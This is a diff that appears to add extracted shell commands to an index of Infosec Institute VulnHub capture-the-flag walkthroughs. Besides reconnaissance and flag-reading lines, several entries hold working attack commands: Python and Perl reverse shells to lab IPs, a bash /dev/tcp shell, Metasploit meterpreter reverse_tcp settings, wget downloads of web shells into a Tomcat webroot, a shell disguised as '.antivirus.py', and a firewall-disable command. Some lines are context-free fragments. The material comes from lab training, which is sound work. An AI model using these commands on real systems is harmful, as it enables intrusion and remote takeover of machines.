@@ -1164,6 +1164,7 @@ Challenge URL: https://resources.infosecinstitute.com/topic/capture-the-flag-a-w
 Challenge Name: so-simple-1-ctf-walkthrough
 Challenge URL: https://resources.infosecinstitute.com/topic/so-simple-1-ctf-walkthrough/
 
+nano simple.txt
 
 
 
@@ -1189,48 +1190,92 @@ Challenge URL: https://resources.infosecinstitute.com/topic/photographer-1-vulnh
 Challenge Name: my-cmsms-1-vulnhub-ctf-walkthrough
 Challenge URL: https://resources.infosecinstitute.com/topic/my-cmsms-1-vulnhub-ctf-walkthrough/
 
+nmap -p- -sV 192.168.1.101
+mysql -h 192.168.1.101 -u root -p
+
+ls -la
+cat .htpasswd
+su armour
+sudo -l
+
 
 
 
 Challenge Name: cybersploit-2-vulnhub-ctf-walkthrough
 Challenge URL: https://resources.infosecinstitute.com/topic/cybersploit-2-vulnhub-ctf-walkthrough/
 
+cat flag.txt
 
 
 
 Challenge Name: cybersploit-1-vulnhub-ctf-walkthrough
 Challenge URL: https://resources.infosecinstitute.com/topic/cybersploit-1-vulnhub-ctf-walkthrough/
 
+nmap 192.168.1.30 -p- -sV
+cat flag2.txt
+cat finalflag.txt
 
 
 
 Challenge Name: photographer-1-ctf-walkthrough-part-1
 Challenge URL: https://resources.infosecinstitute.com/topic/photographer-1-ctf-walkthrough-part-1/
 
+netdiscover
+nmap 192.168.1.26 -p- -sV
+dirb
+smbclient -I 192.168.1.26 -L -N
+
+cat mailsent.txt
+dirb
 
 
 
 Challenge Name: djinn-1-vulnhub-ctf-walkthrough-part-2
 Challenge URL: https://resources.infosecinstitute.com/topic/djinn-1-vulnhub-ctf-walkthrough-part-2/
 
+cat cred.txt
+sudo -l
+
+sudo -u root /root/lago
+
+strings .pyc
+wget 192.168.1.53:9765/.pyc
+file .pyc
+apt-get install python3
+apt-get install python3-pip
+pip3 install uncompyle6
+sudo /root/lago
 
 
 
 Challenge Name: typo-1-vulnhub-ctf-walkthrough-part-2
 Challenge URL: https://resources.infosecinstitute.com/topic/typo-1-vulnhub-ctf-walkthrough-part-2/
 
+nc -lvp 1234
+find / -type f -perm -u=s 2>/dev/null
+strings /usr/local/bin/apache2-restart
 
 
 
 Challenge Name: typo-vulnhub-ctf-walkthrough-part-1
 Challenge URL: https://resources.infosecinstitute.com/topic/typo-vulnhub-ctf-walkthrough-part-1/
 
+nmap -p- -sV 192.168.1.103
 
 
 
 Challenge Name: source-1-vulnhub-ctf-walkthrough
 Challenge URL: https://resources.infosecinstitute.com/topic/source-1-vulnhub-ctf-walkthrough/
 
+netdiscover
+nmap -sV 192.168.1.22
+
+msfconsole
+
+
+
+id
+cat /root/root.txt
 
 
 
@@ -1243,6 +1288,10 @@ Challenge URL: https://resources.infosecinstitute.com/topic/pwned-1-vulnhub-ctf-
 Challenge Name: zion-1-2-vulnhub-ctf-walkthrough-part-1
 Challenge URL: https://resources.infosecinstitute.com/topic/zion-1-2-vulnhub-ctf-walkthrough-part-1/
 
+nmap -p- -sV 192.168.1.4
+dirb http://192.168.1.4
+cewl http://192.168.1.4/
+cat >> key
 
 
 
@@ -1254,6 +1303,7 @@ Challenge URL: https://resources.infosecinstitute.com/topic/sunset-decoy-vulnhub
 
 Challenge Name: victim-1-vulnhub-ctf-walkthrough
 Challenge URL: https://resources.infosecinstitute.com/topic/victim-1-vulnhub-ctf-walkthrough/
+
 
 
 
@@ -1285,6 +1335,7 @@ Challenge URL: https://resources.infosecinstitute.com/topic/capture-the-flag-a-w
 Challenge Name: hacknos-player-1-ctf-walkthrough
 Challenge URL: https://resources.infosecinstitute.com/topic/hacknos-player-1-ctf-walkthrough/
 
+dirb
 
 
 
@@ -1297,6 +1348,10 @@ Challenge URL: https://resources.infosecinstitute.com/topic/me-and-my-girlfriend
 Challenge Name: dmv-1-vulnhub-capture-the-flag-ctf-walkthrough
 Challenge URL: https://resources.infosecinstitute.com/topic/dmv-1-vulnhub-capture-the-flag-ctf-walkthrough/
 
+nc -lvp 1234
+ls -a
+cat clean.sh
+nc -lvp 4444
 
 
 
@@ -1484,12 +1539,26 @@ sudo –i
 Challenge Name: lampiao-1-ctf-walkthrough
 Challenge URL: https://resources.infosecinstitute.com/topic/lampiao-1-ctf-walkthrough/
 
+netdiscover
+nmap 192.168.1.24 -p- -sV
+dirb http://192.168.1.24:1898/
+set rhost 192.168.1.24
+set rport 1898
+set payload php/meterpreter/reverse_tcp
+set lhost 192.168.1.23
+set lport 443
+id
+python -c ‘import pty;pty.spawn(“/bin/bash”)’
+uname -a
+cat /etc/issue
 
 
 
 Challenge Name: node-1-ctf-walkthrough
 Challenge URL: https://resources.infosecinstitute.com/topic/node-1-ctf-walkthrough/
 
+cat myplace.backup | base64 -d > myplace
+file myplace
 
 
 
@@ -1508,6 +1577,18 @@ Challenge URL: https://resources.infosecinstitute.com/topic/goldeneye-1-ctf-walk
 Challenge Name: wakanda1-ctf-walkthrough
 Challenge URL: https://resources.infosecinstitute.com/topic/wakanda1-ctf-walkthrough/
 
+uname -a
+cat /etc/issue
+import socket,subprocess,os;
+wget 192.168.1.45/pythonshell.py
+cp pythonshell.py /srv/.antivirus.py
+nc –lvp 4545
+python -c ‘import pty;pty.spawn(“/bin/bash”)’
+cd /home/devops
+ls
+cat flag2.txt
+wget 192.168.1.45/bbbb/setup.py
+sudo /usr/bin/pip install . –upgrade –force-reinstall
 
 
 
@@ -1545,6 +1626,8 @@ Challenge Name: jis-ctf-vulnupload-walkthrough
 Challenge URL: https://resources.infosecinstitute.com/topic/jis-ctf-vulnupload-walkthrough/
 
 
+perl -e ‘use Socket;$i=”192.168.1.45″;$p=2323;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”>&S”);open(STDOUT,”>&S”);open(STDERR,”>&S”);exec(“/bin/sh -i”);};’
+
 
 
 Challenge Name: usv-2017-part-2-ctf-walkthrough
@@ -1556,6 +1639,7 @@ Challenge URL: https://resources.infosecinstitute.com/topic/usv-2017-part-2-ctf-
 Challenge Name: usv-2017-part-1-ctf-walkthrough
 Challenge URL: https://resources.infosecinstitute.com/topic/usv-2017-part-1-ctf-walkthrough/
 
+if (_0xb252x4 == 1079950212331060) {
 
 
 
@@ -1568,6 +1652,7 @@ Challenge URL: https://resources.infosecinstitute.com/topic/6-days-lab-1-1-ctf-w
 Challenge Name: bulldog-1-ctf-walkthrough
 Challenge URL: https://resources.infosecinstitute.com/topic/bulldog-1-ctf-walkthrough/
 
+python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“192.168.100.11”,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’&
 
 
 
@@ -1580,12 +1665,20 @@ Challenge URL: https://resources.infosecinstitute.com/topic/zico-2-1-ctf-walkthr
 Challenge Name: depth-1-ctf-walkthrough
 Challenge URL: https://resources.infosecinstitute.com/topic/depth-1-ctf-walkthrough/
 
+sh -c $@|sh . echo ssh bill@localhost sudo -l
+sh -c $@|sh . echo ssh bill@localhost sudo ufw disable
+sh -c $@|sh . echo ssh bill@localhost sudo wget “http://10.0.2.15:8000/shell.jsp” -O /var/lib/tomcat8/webapps/ROOT/shell.jsp
+ssh bill@localhost sudo bash -i>& /dev/tcp/10.0.2.15/4444 0>&1
 
 
 
 Challenge Name: proteus-1-ctf-walkthrough
 Challenge URL: https://resources.infosecinstitute.com/topic/proteus-1-ctf-walkthrough/
 
+strings
+objdump
+wget http://172.16.92.141/shell.txt -O /tmp/shell.php
+php /tmp/shell.php;
 
 
 
@@ -1634,11 +1727,14 @@ Challenge URL: https://resources.infosecinstitute.com/topic/super-mario-ctf-walk
 Challenge Name: billubox-ctf-walkthrough-2
 Challenge URL: https://resources.infosecinstitute.com/topic/billubox-ctf-walkthrough-2/
 
+python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“192.168.1.120”,4545));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’
 
 
 
 Challenge Name: donkeydocker1-ctf-walkthrough
 Challenge URL: https://resources.infosecinstitute.com/topic/donkeydocker1-ctf-walkthrough/
+
+ls -a
 
 
 
